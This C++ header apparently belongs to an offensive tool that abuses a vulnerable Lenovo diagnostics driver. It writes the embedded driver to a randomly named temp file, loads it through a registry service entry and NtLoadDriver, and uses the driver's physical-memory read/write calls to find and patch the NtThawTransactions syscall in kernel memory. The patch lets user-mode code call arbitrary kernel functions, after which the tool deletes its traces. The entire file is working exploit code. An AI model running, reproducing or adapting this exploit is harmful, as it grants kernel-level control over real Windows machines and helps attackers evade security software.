#pragma once 
#include "drv.h"
#include "utils.h"
#include "rawimage.h"
#include <type_traits>
#include <mutex>
#include <atomic>
#include <thread>

#define DEVICE_NAME L"\\\\.\\LenovoDiagnosticsDriver"
HANDLE hDevice = 0;

struct read_t // 0x10 ouput=8
{
	uint64_t PhysicalAddress;
	uint64_t dataSize;
};

struct write_t // 0x18 outpu==0
{
	uint64_t PhysicalAddress;
	uint64_t dataSize;
	uint64_t SrcAddress;
};

namespace driver
{
	std::string szDriverName;
	std::string szDriverPath;
	
	namespace service
	{
		bool GetLoadPriv()
		{
			HANDLE hToken = 0;
			TOKEN_PRIVILEGES tp;
			LUID luid{};

			if (!OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
				return false;

			if (!LookupPrivilegeValueW(NULL, L"SeLoadDriverPrivilege", &luid))
				return false;

			tp.PrivilegeCount = 1;
			tp.Privileges[0].Luid = luid;
			tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL))
				return false;

			CloseHandle(hToken);
			return true;
		}

		BOOL CreateSvc()
		{
			DWORD Type = 1; // kerneldriver 
			DWORD ErrorControl = 3;
			DWORD Start = 3;

			HKEY hKey;
			std::string szKey = "SYSTEM\\CurrentControlSet\\Services\\" + szDriverName;

			auto result = RegCreateKeyA(HKEY_LOCAL_MACHINE, szKey.c_str(), &hKey);
			if (result != ERROR_SUCCESS)
				return false;

			result = RegSetValueExA(hKey, "Type", NULL, REG_DWORD, (PBYTE)&Type, 4);
			if (result != ERROR_SUCCESS)
				return false;

			result = RegSetValueExA(hKey, "ErrorControl", NULL, REG_DWORD, (PBYTE)&ErrorControl, 4);
			if (result != ERROR_SUCCESS)
				return false;

			result = RegSetValueExA(hKey, "Start", NULL, REG_DWORD, (PBYTE)&Start, 4);
			if (result != ERROR_SUCCESS)
				return false;

			auto imagePath = "\\??\\" + utils::GenTempPath() + "\\" + szDriverName + ".sys";
			result = RegSetValueExA(hKey, "ImagePath", NULL, REG_SZ, (PBYTE)imagePath.c_str(), imagePath.size());
			if (result != ERROR_SUCCESS)
				return false;

			return ERROR_SUCCESS == RegCloseKey(hKey);
		}

		BOOL DeleteSvc()
		{
			std::string szKey = "SYSTEM\\CurrentControlSet\\Services\\" + szDriverName;
			return RegDeleteTreeA(HKEY_LOCAL_MACHINE, szKey.c_str()) == ERROR_SUCCESS;
		}
	}

	bool IsRunning()
	{
		HANDLE h = CreateFileW(DEVICE_NAME, FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (IsValidHandle(h))
		{
			hDevice = h;
			return true;
		}
		return false;
	}

	void Unload()
	{
		std::string szRegPath = "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + szDriverName;
		ANSI_STRING anRegPath;
		UNICODE_STRING unRegPath;
		NTSTATUS status;
		RtlInitAnsiString(&anRegPath, szRegPath.c_str());
		RtlAnsiStringToUnicodeString(&unRegPath, &anRegPath, true);

		if (IsValidHandle(hDevice))
			CloseHandle(hDevice);

		if (!NT_SUCCESS(status = NtUnloadDriver(&unRegPath)))
		{
			// printf("[-] NtUnloadDriver return : 0x%08X\n", status);
		}

		if(!service::DeleteSvc())
		{
			//
		}
		
		if (!utils::DeleteFileFromDisk(szDriverPath))
		{
			//
		}

		printf("[+] driver is unloaded.\n");
	}

	bool Load()
	{
		if (IsRunning())
		{
			printf("[+] driver is already running.\n");
			return true;
		}
		hDevice = 0;
		szDriverName = utils::GenRandomStr();
		szDriverPath = utils::GenTempPath() + "\\" + szDriverName + ".sys";
		printf("[+] driver path : %s\n", szDriverPath.c_str());

		bool result = false;
		bool bFileCreated = false;
		bool bSvcCreated = false; 

		do
		{
			if (!service::GetLoadPriv())
			{
				printf("[-] failed to get privildge. run with admin mode!\n");
				break;
			}
			printf("[+] got load driver priv\n");

			if (!(bFileCreated = utils::CreateFileFromMemory(szDriverPath, (void*)binaryData, sizeof(binaryData))))
			{
				printf("[-] failed to create binary\n");
				break;
			}
			printf("[+] .sys create at temp path\n");

			if (!(bSvcCreated = service::CreateSvc()))
			{
				printf("[-] failed to create reg\n");
				break;
			}
			printf("[+] create service registry\n");

			std::string szRegPath = "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + szDriverName;
			ANSI_STRING anRegPath;
			UNICODE_STRING unRegPath;
			RtlInitAnsiString(&anRegPath, szRegPath.c_str());
			RtlAnsiStringToUnicodeString(&unRegPath, &anRegPath, true);
			NTSTATUS status = NtLoadDriver(&unRegPath);
			if (!NT_SUCCESS(status))
			{
				printf("[-] NtLoadDriver failed with 0x%08X\n", status);
				break;
			}
			printf("[+] NtLoadDriver success with 0x%08X\n", status);

			hDevice = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if (!IsValidHandle(hDevice))
			{
				printf("[-] failed to open device with 0x%08X\n", RtlGetLastNtStatus());
				break;
			}
			printf("[+] driver loaded successfully !\n");

			result = true;
		} while (0);

		if (!result)
		{
			Unload();
		}

		return result;
	}
}

namespace lenovo
{
	// our target syscall 
	constexpr char* szFunction = "NtThawTransactions";

	uint64_t Ntoskrnl;
	size_t	 dwNtoskrnl;

	// first	= ntdll.syscall to invoke kernel function
	// second	= syscall offset in ntoskrnl.exe image
	std::pair<uint64_t, uint32_t> syscall; 

	// physical address represents target syscall
	std::atomic<uint64_t> syscallPhysicalAddr;
	
	template <typename T>
	BOOL ReadPhysical(uint64_t address, T* data)
	{
		if (!address || !data)
			return false;

		if (sizeof(T) > 8)
			false;

		DWORD BytesReturned;
		read_t inbuffer;
		T outBuffer;

		inbuffer.PhysicalAddress = address;
		inbuffer.dataSize = sizeof(T);

		BOOL result = DeviceIoControl(hDevice, CTLCODE_PHYS_R, &inbuffer, 0x10, &outBuffer, sizeof(T), &BytesReturned, NULL);
		if (!result)
			return false;

		*data = (T)outBuffer;
		return true;
	}

	template <typename T>
	BOOL WritePhysical(uint64_t address, T* data)
	{
		if (!address || !data)
			return false;

		if (sizeof(T) > 8)
			false;

		DWORD BytesReturned;
		write_t inbuffer;

		inbuffer.PhysicalAddress = address;
		inbuffer.dataSize = sizeof(T);
		inbuffer.SrcAddress = (uint64_t)data;

		BOOL result = DeviceIoControl(hDevice, CTLCODE_PHYS_W, &inbuffer, 0x18, NULL, 0, &BytesReturned, NULL);
		if (!result)
			return false;

		return true;
	}

	static uint32_t GetNtosExportOffset(LPCSTR szNtApi)
	{
		wchar_t system32path[MAX_PATH];
		GetSystemDirectoryW(system32path, MAX_PATH);
		lstrcatW(system32path, L"\\ntoskrnl.exe");
		DWORD ret = GetFileAttributesW(system32path);

		auto img = LoadLibraryExW(system32path, 0, DONT_RESOLVE_DLL_REFERENCES);
		if (!img)
			return 0;

		auto syscallAddress = GetProcAddress(img, szNtApi);
		FreeLibrary(img);

		auto offset = (ULONG)((uint64_t)syscallAddress - (uint64_t)img);
		return offset;
	}

	static void physMemScanner(ULONG_PTR address, ULONG length)
	{
		DWORD ThreadId = GetCurrentThreadId();
		printf("[+] start scanning range < 0x%016llx, 0x%08x > in thread %d\n", address, length, ThreadId);

		uint64_t pat = 0;
		uint64_t pat2 = 0;
		uint32_t offsetInPage = syscall.second & 0xfff;
		for (auto curr = address; (curr + offsetInPage) < (address + length); curr += USN_PAGE_SIZE)
		{
			if (syscallPhysicalAddr.load() != 0)
				break;

			if (!ReadPhysical(curr + offsetInPage, &pat))
				continue;

			if ((pat & 0x0000000000ffffff) != 0x0000000000158B4C)
				continue;

			ReadPhysical(curr + offsetInPage - 8, &pat2);
			if ((pat2 & 0xCCCCCCCCCCCCCCCC) == 0xCCCCCCCCCCCCCCCC)
			{
				syscallPhysicalAddr.store(curr + offsetInPage);
				break;
			}
		}
		
		printf("[+] end scanning in thread %d\n", ThreadId);
		return;
	}

	bool setupSyscall()
	{
		syscallPhysicalAddr = 0;

		PVOID addr = GetProcAddress(GetModuleHandleA("ntdll.dll"), szFunction);
		if (!addr)
		{
			printf("[-] invalid nt api : %s\n", szFunction);
			return false;
		}
		
		Ntoskrnl = (uint64_t)utils::GetKernelModule("ntoskrnl", &dwNtoskrnl);
		if (!Ntoskrnl)
		{
			printf("[-] failed to get ntoskrnl base.\n");
			return false;
		}
		printf("[+] ntoskrnl < 0x%016llx, size 0x%08llx > \n", Ntoskrnl, dwNtoskrnl);

		uint32_t syscalloffset = GetNtosExportOffset(szFunction);
		if (!syscalloffset)
		{
			printf("[-] invalid export name : %s\n", szFunction);
			return false;
		}

		syscall.first = (uint64_t)addr;
		syscall.second = syscalloffset; 

		std::vector<std::pair<ULONG_PTR, ULONG>> PhysicalMemoryRange;
		if (!utils::GetPhysicalMemoryRange(&PhysicalMemoryRange) || PhysicalMemoryRange.size() == 0)
		{
			printf("[-] failed to query physical memory range.\n");
			return false;
		}
		printf("[+] system has %llu pm ranges. start scanning ...\n", PhysicalMemoryRange.size());

		std::vector<std::thread> scanThreads;
		for (auto range : PhysicalMemoryRange)
			scanThreads.push_back(std::thread(physMemScanner, range.first, range.second));

		for (auto& thread : scanThreads)
			thread.join();
		
		if (syscallPhysicalAddr.load() == 0)
		{
			printf("[-] failed to find target syscall pattern.\n");
			return false;
		}
		printf("[+] %s syscall physical address : 0x%llx\n", szFunction, syscallPhysicalAddr.load());

		return true;
	}

	template<typename T, typename ... A> 
	bool CallKernelFunction(uint64_t kernelfunction, T* ret, A ... args)
	{
		static std::mutex lock;

		uint64_t hookAddress = syscallPhysicalAddr.load(); 
		if (!hookAddress)
			return false;

		// 0. validate context
		constexpr auto noRet = std::is_same_v<T, void>;
		if (!noRet)
		{
			if (!ret)
				return false;
		}
		else
		{
			UNREFERENCED_PARAMETER(ret);
		}

		if (!kernelfunction)
			return false;

		lock.lock();

		// 1. hook 
		uint8_t opcode[12] = {
			0x48, 0xB8,										// mov rax, 
			0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // address
			0xFF, 0xE0 };									// jmp rax 
		
		*(uint64_t*)(opcode + 2) = kernelfunction;

		uint64_t orgBytesOffset0 = 0;
		uint32_t orgBytesOffset8 = 0;

		ReadPhysical(hookAddress, &orgBytesOffset0);
		ReadPhysical(hookAddress + 8, &orgBytesOffset8);

		WritePhysical(hookAddress, (uint64_t*)(&opcode[0]));
		WritePhysical(hookAddress + 8, (uint32_t*)(&opcode[8]));

		// 2. call 
		if constexpr (!noRet)
		{
			using fn_t = T(NTAPI*)(A...);
			const auto fn = reinterpret_cast<fn_t>(syscall.first);
			*ret = fn(args...);
		}
		else
		{
			using fn_t = void(NTAPI*)(A...);
			const auto fn = reinterpret_cast<fn_t>(syscall.first);
			fn(args...);
		}

		// 3. restore 
		WritePhysical(hookAddress, &orgBytesOffset0);
		WritePhysical(hookAddress + 8, &orgBytesOffset8);

		lock.unlock();
		return true;
	}
	
	bool MemCopy(void* dst, void* src, size_t size)
	{
		uint32_t offset = GetNtosExportOffset("memcpy");
		if (!offset)
			return false;

		uint64_t callAddress = Ntoskrnl + offset;
		return CallKernelFunction<void>(callAddress, nullptr, dst, src, size);
	}

	uint64_t IoGetCurrentProcess()
	{
		uint32_t offset = GetNtosExportOffset("IoGetCurrentProcess");
		if (!offset)
			return 0;

		uint64_t callAddress = Ntoskrnl + offset;
		uint64_t eProcess = 0;
		if (!CallKernelFunction(callAddress, &eProcess))
			return 0;

		return eProcess;
	}
}

template BOOL lenovo::ReadPhysical<uint64_t>(uint64_t address, uint64_t* data);
template BOOL lenovo::ReadPhysical<uint32_t>(uint64_t address, uint32_t* data);
template BOOL lenovo::ReadPhysical<uint16_t>(uint64_t address, uint16_t* data);
template BOOL lenovo::ReadPhysical<uint8_t>(uint64_t address, uint8_t* data);
template BOOL lenovo::WritePhysical<uint64_t>(uint64_t address, uint64_t* data);
template BOOL lenovo::WritePhysical<uint32_t>(uint64_t address, uint32_t* data);
template BOOL lenovo::WritePhysical<uint16_t>(uint64_t address, uint16_t* data);
template BOOL lenovo::WritePhysical<uint8_t>(uint64_t address, uint8_t* data);